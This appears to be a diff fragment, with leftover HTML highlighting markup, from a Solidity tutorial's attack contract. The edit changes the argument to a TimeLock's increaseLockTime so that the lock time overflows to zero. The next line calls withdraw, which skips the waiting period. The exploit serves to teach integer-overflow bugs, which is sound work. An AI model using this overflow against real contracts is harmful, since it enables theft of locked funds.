@@ -63,9 +63,11 @@ before the 1 week waiting period.
         if t = current lock time then we need to find x such that
         x + t = 2**256 = 0
         so x = -t
+        2**256 = type(uint).max + 1
+        so x = type(uint).max + 1 - t
         */</span>
         timeLock.increaseLockTime(
-            <span class=\\"hljs-built_in\\">type</span>(<span class=\\"hljs-keyword\\">uint</span>).<span class=\\"hljs-built_in\\">max</span> - timeLock.lockTime(<span class=\\"hljs-keyword\\">address</span>(<span class=\\"hljs-built_in\\">this</span>))
+            <span class=\\"hljs-built_in\\">type</span>(<span class=\\"hljs-keyword\\">uint</span>).<span class=\\"hljs-built_in\\">max</span> + <span class=\\"hljs-number\\">1</span>- timeLock.lockTime(<span class=\\"hljs-keyword\\">address</span>(<span class=\\"hljs-built_in\\">this</span>))
         );
         timeLock.withdraw();
     }
